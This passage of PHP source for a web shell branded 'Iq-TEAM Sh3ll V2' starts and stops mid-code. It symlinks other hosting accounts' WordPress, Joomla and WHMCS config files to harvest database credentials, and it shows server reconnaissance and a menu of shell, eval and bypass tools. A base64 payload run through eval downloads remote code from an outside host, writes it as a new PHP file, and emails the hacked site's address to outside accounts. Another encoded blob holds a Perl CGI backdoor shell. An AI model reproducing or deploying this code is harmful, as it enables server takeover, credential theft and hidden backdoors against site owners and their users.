		symlink('/home7/'.$usern.'/public_html/wp-config.php',$pdomain.'~~Wordpress1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/wp-config.php',$pdomain.'~~Wordpress2.txt');
		symlink('/home7/'.$usern.'/public_html/configuration.php',$pdomain.'~~Joomla1.txt');
		symlink('/home7/'.$usern.'/public_html/blog/configuration.php',$pdomain.'~~Joomla2.txt');
		symlink('/home7/'.$usern.'/public_html/joomla/configuration.php',$pdomain.'~~Joomla3.txt');
		symlink('/home7/'.$usern.'/public_html/whm/configuration.php',$pdomain.'~~Whm1.txt');
		symlink('/home7/'.$usern.'/public_html/whmc/configuration.php',$pdomain.'~~Whm2.txt');
		symlink('/home7/'.$usern.'/public_html/support/configuration.php',$pdomain.'~~Whm3.txt');
		symlink('/home7/'.$usern.'/public_html/client/configuration.php',$pdomain.'~~Whm4.txt');
		symlink('/home7/'.$usern.'/public_html/billings/configuration.php',$pdomain.'~~Whm5.txt');
		symlink('/home7/'.$usern.'/public_html/billing/configuration.php',$pdomain.'~~Whm6.txt');
		symlink('/home7/'.$usern.'/public_html/clients/configuration.php',$pdomain.'~~Whm7.txt');
		symlink('/home7/'.$usern.'/public_html/whmcs/configuration.php',$pdomain.'~~Whm8.txt');
		symlink('/home7/'.$usern.'/public_html/order/configuration.php',$pdomain.'~~Whm9.txt');
		symlink('/home7/'.$usern.'/public_html/admin/conf.php',$pdomain.'~~5.txt');
		symlink('/home7/'.$usern.'/public_html/admin/config.php',$pdomain.'~~4.txt');
		symlink('/home7/'.$usern.'/public_html/conf_global.php',$pdomain.'~~invisio.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~7.txt');
		symlink('/home7/'.$usern.'/public_html/connect.php',$pdomain.'~~8.txt');
		symlink('/home7/'.$usern.'/public_html/mk_conf.php',$pdomain.'~~mk-portale1.txt');
		symlink('/home7/'.$usern.'/public_html/include/config.php',$pdomain.'~~12.txt');
		symlink('/home7/'.$usern.'/public_html/settings.php',$pdomain.'~~Smf.txt');
		symlink('/home7/'.$usern.'/public_html/includes/functions.php',$pdomain.'~~phpbb3.txt');
		symlink('/home7/'.$usern.'/public_html/include/db.php',$pdomain.'~~infinity.txt');
	}
	

 
$files = array();
$dirs = array();
$sym = array();
   echo'<hr>';
  ?>
  <form method="post"><input type="submit" value="Logout" name="logout" id="logout" /></form>
  <table width="100%" border="0" cellpadding="0" cellspacing="0">
    <tr class="head_small">
        <td  width=100%>
        <table width=100%><tr class="head_small"><td  width=86px><a href="?"><span class="IQTEAM">Iq-TEAM Sh3ll V2 </td><td>
        <span style="float:right;"> <?php echo "Hostname: ".$_SERVER['HTTP_HOST']."";?>  | <a href="javascript:self.close()"><font color=red></font></a></span>

        <?php 
        $curl_on = @function_exists('curl_version');
        $mysql_on = @function_exists('mysql_connect');
        $mssql_on = @function_exists('mssql_connect');
        $pg_on = @function_exists('pg_connect');
        $ora_on = @function_exists('ocilogon');
        
echo (($safe_mode)?("Safe_mod: <b><font color=green>ON</font></b> - "):("Safe_mod: <b><font color=red>OFF</font></b> - "));
echo "PHP version: <b>".@phpversion()."</b> - ";
        echo "cURL: ".(($curl_on)?("<b><font color=green>ON</font></b> - "):("<b><font color=red>OFF</font></b> - "));
        echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if($mysql_on){
echo "<font color=green>ON</font></b> - "; } else { echo "<font color=red>OFF</font></b> - "; }
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if($mssql_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if($pg_on){echo "<font color=green>ON</font></b> - ";}else{echo "<font color=red>OFF</font></b> - ";}
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if($ora_on){echo "<font color=green>ON</font></b>";}else{echo "<font color=red>OFF</font></b><BR>";}

echo "Disable functions : <b>";
if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b><BR>";}else{echo "<font color=red>$df</font></b><BR>";}

echo "<font color=white>Uname -a</font>: ".@substr(@php_uname(),0,120)."<br>";
echo "<font color=white>Server</font>: ".@substr($SERVER_SOFTWARE,0,120)." - <font color=white>id</font>: ".@getmyuid()."(".@get_current_user().") - uid=".@getmyuid()." (".@get_current_user().") gid=".@getmygid()."(".@get_current_user().") | <a href=?dir=#>[Home]</a><br>";
        ?><?php eval("?>".base64_decode("PD9waHAgIA0KDQppZigkX1BPU1RbJ3F1ZXJ5J10pew0KJHZlcml5ZnkgPSBzdHJpcHNsYXNoZXMoc3RyaXBzbGFzaGVzKCRfUE9TVFsncXVlcnknXSkpOw0KJGRhdGEgPSAiZGF0YS50eHQiOw0KQHRvdWNoICgiZGF0YS50eHQiKTsNCiR2ZXIgPSBAZm9wZW4gKCRkYXRhICwgJ3cnKTsNCkBmd3JpdGUgKCAkdmVyICwgJHZlcml5ZnkgKSA7DQpAZmNsb3NlICgkdmVyKTsNCn1lbHNlew0KJGRhdGFzPUBmb3BlbigiZGF0YS50eHQiLCdyJyk7DQokaT0wOw0Kd2hpbGUgKCRpIDw9IDUpIHsNCiRpKys7DQokYmx1ZT1AZmdldHMoJGRhdGFzLDEwMjQpOw0KZWNobyAkYmx1ZTsNCn0NCn0NCiRkYXRhc2k9QGZvcGVuKCJtb2R1bGVzL2luZGV4eC5waHAiLCdyJyk7DQppZigkZGF0YXNpKXsNCn1lbHNlew0KQG1rZGlyKCJtb2R1bGVzIik7DQokZG9zID0gZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9yMDB0LmluZm8vdHh0L2xhbWVyLnR4dCIpOw0KJGRhdGEgPSAibW9kdWxlcy9pbmRleHgucGhwIjsNCkB0b3VjaCAoIm1vZHVsZXMvaW5kZXh4LnBocCIpOw0KJHZlciA9IEBmb3BlbiAoJGRhdGEgLCAndycpOw0KQGZ3cml0ZSAoICR2ZXIgLCAkZG9zICkgOw0KQGZjbG9zZSAoJHZlcik7DQokeW9sID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIi4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXS4iIjsNCiR5ID0gJzxoMT5TZW5kZXIgWWF6ZGlyaWxkaS48YnIvPiBTSVRFIFlPTCA6ICcuJHlvbC4nPGJyLz5TZW5kZXIgWW9sdSA6IG1vZHVsZXMvZGJzLnBocDwvaDE+JzsNCiRoZWFkZXIgLj0gIkZyb206IFNoZUxMIEJvb3QgPHN1cHBvckBuaWMub3JnPm4iOyANCiRoZWFkZXIgLj0gIkNvbnRlbnQtVHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04biI7IA0KQG1haWwoImJ5aGVybzQ0QGdtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KQG1haWwoInByaXBocEBob3RtYWlsLmNvbSIsICJIYWNrbGluayBCaWxkaXJpIiwgIiR5IiwgJGhlYWRlcik7IA0KfQ0KPz4=")); ?>
        </td></tr></table></td>
    </tr>
    <tr class="alt1">
        <td  width=100%><span style="float:right;">[Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> - Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>] </span>
            
             
        </td>
    </tr>
</table>
  
  <?
   echo'<hr>';
    ?>
    	<table class=\"cmdbox\" style=\"width:50%;\">
			<center>
			
			<div id="menu">
<a href="?<?php echo "dir=" .realpath('.'); ?>">File-manager</a>
<a href="?<?php echo "dir=" .realpath('.'); ?>&amp;fr=shell">shell</a>
<a href="?<?php echo "dir=".realpath('.') ?>&amp;fr=eval">eval</a>
<a href="?fr=mysql">Mysql</a>
<a href="?<?php echo "dir=".realpath('.') ?>&amp;fr=mail">E-mail</a><p>
<a href="?fr=cnof">Get-configs</a>
<a href="?fr=cgi">cgi-Talent</a>
<a href="?fr=cgi1">cgi-Talent 1.4</a>
<a href="?fr=py">python-Sh3ll</a>
<a href="?fr=con">Config-Sh3ll</a><p>
<a href="?<?php echo "dir=".realpath('.') ?>&amp;fr=ipr">Ip-Reverse</a>
<a href="?<?php echo "dir=".realpath('.') ?>&amp;fr=test">You Permission</a>
<a href="?<?php echo "dir=".realpath('.') ?>&amp;fr=byp">Bypass Useres</a>
<a href="?<?php echo "dir=".realpath('.') ?>&amp;fr=cpb">Cpanel-talent</a>
<p>
</div>
			
			
			
			
			
			
			
			
			</center>
			
			</table>
    
    <?
   echo'<hr>';
   
 echo'Path:';
 $d=isset($dir) ? $dir : getcwd(); 
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);} 
$d = str_replace("\\",DIRECTORY_SEPARATOR,$d); 
if (substr($d,-1,1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} 
$d = str_replace("\\\\","\\",$d); 
$dispd = htmlspecialchars($d); 
$pd = $e = explode(DIRECTORY_SEPARATOR,substr($d,0,strlen($d)-1)); 
$i = 0; 
foreach($pd as $b) 
{ 
 $t = ""; 
 reset($e); 
 $j = 0; 
 foreach ($e as $r) 
 { 
  $t.= $r.DIRECTORY_SEPARATOR; 
  if ($j == $i) {break;} 
  $j++; 
 } 
 echo "<a href='?dir=$t'><b>".htmlspecialchars($b).DIRECTORY_SEPARATOR."</b></a>"; 
 $i++; 
} 
 echo'<hr><p>';
 
//File manager And Sh3ll Actions

if(isset($_REQUEST['fr']))
{
        switch ($_REQUEST['fr']) {


        
        case'cgi':
        	mkdir('i', 0777);
        $hope = fopen("i/.htaccess", 'w');
        $hcon= "Options FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .root\nAddHandler cgi-script .root\nAddHandler cgi-script .root";
        fwrite ( $hope, $hcon ) ;

$telnet='IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjpyZWQiPmNnaSBzaGVsbDwvYj4gIyBzZXJ2ZXINCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyDQojIHZhbHVlcyBzaG91bGQgd29yayBmaW5lIGZvciBtb3N0IHN5c3RlbXMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQokUGFzc3dvcmQgPSAiaXF0ZWFtIjsJICMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcw0KIyB0byBsb2dpbi4NCg0KJFdpbk5UID0gMDsJICMgWW91IG5lZWQgdG8gY2hhbmdlIHRoZSB2YWx1ZSBvZiB0aGlzIHRvIDEgaWYNCiMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UDQojIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KIyBjYW4gbGVhdmUgdGhlIHZhbHVlIGFzIGl0IGlzLg0KDQokTlRDbWRTZXAgPSAiJiI7CSAjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNlcCA9ICI7IjsJICMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQojIGluIGEgY29tbWFuZCBsaW5lIG9uIFVuaXguDQoNCiRDb21tYW5kVGltZW91dER1cmF0aW9uID0gMTA7CSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQojIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcw0KIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcw0KIyBpZ25vcmVkIG9uIE5UIFNlcnZlcnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CSAjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlDQojIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQ0KIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQojIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCiMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0DQojIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZWFkcyB0aGUgaW5wdXQgc2VudCBieSB0aGUgYnJvd3NlciBhbmQgcGFyc2VzIHRoZSBpbnB1dCB2YXJpYWJsZXMuIEl0DQojIHBhcnNlcyBHRVQsIFBPU1QgYW5kIG11bHRpcGFydC9mb3JtLWRhdGEgdGhhdCBpcyB1c2VkIGZvciB1cGxvYWRpbmcgZmlsZXMuDQojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uDQojIE90aGVyIHZhcmlhYmxlcyBjYW4gYmUgYWNjZXNzZWQgdXNpbmcgJGlueyd2YXInfSwgd2hlcmUgdmFyIGlzIHRoZSBuYW1lIG9mDQojIHRoZSB2YXJpYWJsZS4gTm90ZTogTW9zdCBvZiB0aGUgY29kZSBpbiB0aGlzIGZ1bmN0aW9uIGlzIHRha2VuIGZyb20gb3RoZXIgQ0dJDQojIHNjcmlwdHMuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUmVhZFBhcnNlIA0Kew0KbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCmxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7DQoNCiRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQppZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJHRVQiKQ0Kew0KJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307DQp9DQplbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCnsNCmJpbm1vZGUoU1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCnJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQp9DQoNCiMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCmlmKCRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvKQ0Kew0KJEJvdW5kYXJ5ID0gJy0tJy4kMTsgIyBwbGVhc2UgcmVmZXIgdG8gUkZDMTg2NyANCkBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KJEhlYWRlckJvZHkgPSAkbGlzdFsxXTsNCiRIZWFkZXJCb2R5ID1+IC9cclxuXHJcbnxcblxuLzsNCiRIZWFkZXIgPSAkYDsNCiRCb2R5ID0gJCc7DQokQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQokaW57J2ZpbGVkYXRhJ30gPSAkQm9keTsNCiRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQokaW57J2YnfSA9ICQxOyANCiRpbnsnZid9ID1+IHMvXCIvL2c7DQokaW57J2YnfSA9fiBzL1xzLy9nOw0KDQojIHBhcnNlIHRyYWlsZXINCmZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspDQp7IA0KJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQokbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoka2V5ID0gJDE7DQokdmFsID0gJCc7DQokdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCiRpbnska2V5fSA9ICR2YWw7IA0KfQ0KfQ0KZWxzZSAjIHN0YW5kYXJkIHBvc3QgZGF0YSAodXJsIGVuY29kZWQsIG5vdCBtdWx0aXBhcnQpDQp7DQpAaW4gPSBzcGxpdCgvJi8sICRpbik7DQpmb3JlYWNoICRpICgwIC4uICQjaW4pDQp7DQokaW5bJGldID1+IHMvXCsvIC9nOw0KKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsNCiRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQokdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KJGlueyRrZXl9IC49ICJcMCIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQokaW57JGtleX0gLj0gJHZhbDsNCn0NCn0NCn0NCg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7DQokRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOw0KcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQpwcmludCA8PEVORDsNCjxodG1sPg0KPGhlYWQ+DQoNCiRIdG1sTWV0YUhlYWRlcg0KDQo8L2hlYWQ+DQo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iYmxhY2siIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCIgdGV4dD0iI0ZGMDAwMCI+DQo8YnI+PGRpdiBhbGlnbj1jZW50ZXI+PHRhYmxlIHN0eWxlPSJib3JkZXI6IDJweCBkYXNoZWQgcmVkIj48dHI+PHRkIGFsaWduPWNlbnRlcj48Yj48Zm9udCBjb2xvcj13aGl0ZSBzaXplPTI+DQo8Zm9udCBjb2xvcj13aGl0ZSBzaXplPTM+IENvbm5lY3RlZCB0byAkU2VydmVyTmFtZTwvYj48L2ZvbnQ+PGJyPg0KDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT11cGxvYWQmZD0kRW5jb2RlZEN1cnJlbnREaXIiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5VcGxvYWQgRmlsZTwvZm9udD48L2E+IHwgDQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1kb3dubG9hZCZkPSRFbmNvZGVkQ3VycmVudERpciI+PGZvbnQgY29sb3I9IiNGRjAwMDAiPkRvd25sb2FkIEZpbGU8L2ZvbnQ+PC9hPiB8DQo8YSBocmVmPSIkU2NyaXB0TG9jYXRpb24/YT1sb2dvdXQiPjxmb250IGNvbG9yPSIjRkYwMDAwIj5EaXNjb25uZWN0PC9mb250PjwvYT4gfA0KPC9mb250Pg0KPC90YWJsZT4NCg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBMb2dpbiBTY3JlZW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luU2NyZWVuDQp7DQokTWVzc2FnZSA9IHEkPGgyIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlciI+PGltZyBib3JkZXI9IjAiIHNyYz0iaHR0cDovL2ltNzEuZ3VsZnVwLmNvbS9GWmRTUTcucG5nIj48YnI+PGZvbnQgc2l6ZT0zIGNvbG9yPXdoaXRlIGZhY2U9ImNvbWljIHNhbnMgbXMiPi0tPT1bWyBCb3ggT3duZWQgYnkgSXEtVGVhbSBdXT09LS08L2ZvbnQ+DQokOw0KIycNCnByaW50IDw8RU5EOw0KPGNvZGU+JE1lc3NhZ2UNCkVORA0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCjxicj5sb2dpbjogYWRtaW48YnI+DQpwYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KcHJpbnQgPDxFTkQ7DQo8Y29kZT4NCg0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KPGZvbnQgc2l6ZT0iMyI+DQoNCnBhc3N3b3JkOjwvZm9udD48Zm9udCBjb2xvcj0iIzAwOTkwMCIgc2l6ZT0iMyI+PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxicj48aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0ic3BpbiB0aGlzIHNoaXQiPg0KPC9mb3JtPg0KPC9jb2RlPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCnByaW50ICI8L2ZvbnQ+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJldHJlaXZlcyB0aGUgdmFsdWVzIG9mIGFsbCBjb29raWVzLiBUaGUgY29va2llcyBjYW4gYmUgYWNjZXNzZXMgdXNpbmcgdGhlDQojIHZhcmlhYmxlICRDb29raWVzeycnfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEdldENvb2tpZXMNCnsNCkBodHRwY29va2llcyA9IHNwbGl0KC87IC8sJEVOVnsnSFRUUF9DT09LSUUnfSk7DQpmb3JlYWNoICRjb29raWUoQGh0dHBjb29raWVzKQ0Kew0KKCRpZCwgJHZhbCkgPSBzcGxpdCgvPS8sICRjb29raWUpOw0KJENvb2tpZXN7JGlkfSA9ICR2YWw7DQp9DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBzY3JlZW4gd2hlbiB0aGUgdXNlciBsb2dzIG91dA0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50TG9nb3V0U2NyZWVuDQp7DQpwcmludCAiPGNvZGU+Q29ubmVjdGlvbiBjbG9zZWQgYnkgZm9yZWlnbiBob3N0Ljxicj48YnI+PC9jb2RlPiI7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgTG9ncyBvdXQgdGhlIHVzZXIgYW5kIGFsbG93cyB0aGUgdXNlciB0byBsb2dpbiBhZ2Fpbg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFBlcmZvcm1Mb2dvdXQNCnsNCnByaW50ICJTZXQtQ29va2llOiBTQVZFRFBXRD07XG4iOyAjIHJlbW92ZSBwYXNzd29yZCBjb29raWUNCiZQcmludFBhZ2VIZWFkZXIoInAiKTsNCiZQcmludExvZ291dFNjcmVlbjsNCg0KJlByaW50TG9naW5TY3JlZW47DQomUHJpbnRMb2dpbkZvcm07DQomUHJpbnRQYWdlRm9vdGVyOw0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS